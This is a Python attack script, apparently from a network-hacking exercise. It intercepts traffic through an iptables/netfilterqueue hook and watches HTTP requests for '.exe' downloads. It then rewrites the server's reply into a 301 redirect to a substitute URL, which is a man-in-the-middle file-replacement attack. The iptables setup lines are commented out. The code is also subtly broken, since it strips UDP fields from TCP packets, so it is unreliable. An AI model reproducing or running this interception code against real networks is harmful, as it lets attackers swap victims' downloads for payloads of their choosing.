import optparse;
import subprocess;
import netfilterqueue
import scapy.all as scapy
import gzip
import re
queue_port = 0

def option_parser():
    parser = optparse.OptionParser()
    parser.add_option('-c', '--command', dest='internal', help='Enter INTERNAL')
    options, arguments = parser.parse_args()
    return options
def configure_queue():
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(queue_port, packet_grabber)
    try:
        queue.run()
    except KeyboardInterrupt:
        print('\n\n[+] - Pressed CTRL + C .... Quitting!! Flushing!!')
        subprocess.call(['iptables', '--flush'])
        queue.unbind()
ack_response_list = []
def packet_grabber(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        sport = scapy_packet[scapy.TCP].sport
        dport = scapy_packet[scapy.TCP].dport
        print(sport, dport)
        if scapy_packet[scapy.Raw].load:
            print(sport, dport)
            if dport == 80 or dport == 443 or dport == 10000:
                load = str(scapy_packet[scapy.Raw].load)
                # gzipCompressed = gzip.compress(data=b'.exe')
                # exe = re.sub("[^b']", '', str(gzipCompressed))
                # print(exe)
                # print('gzip .exe', str(gzipCompressed))
                # print('load', load)
                if '.exe' in load:
                    print(load)
                    ack = scapy_packet[scapy.TCP].ack
                    ack_response_list.append(ack)
            elif sport == 80 or sport == 443 or sport == 10000:
                seq = scapy_packet[scapy.TCP].seq
                if seq in ack_response_list:
                    ack_response_list.remove(seq)
                    scapy_packet[scapy.Raw].load = 'HTTP/1.1 301 Moved Permanently\nLocation: https://st2.depositphotos.com/1000393/6507/i/600/depositphotos_65076917-stock-photo-hacker-and-terrorism-fight.jpg'

                    # delete chksum, len
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.UDP].len
                    del scapy_packet[scapy.UDP].chksum
                    packet.set_payload(bytes(scapy_packet))


    packet.accept()

options = option_parser()
# if not options.internal:
#     print('[+] - Spoofing externally')
#     subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', str(queue_port)])
# else:
#     print('[+] - Spoofing internally')
#     subprocess.call(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', str(queue_port)])
#     subprocess.call(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', str(queue_port)])

configure_queue()

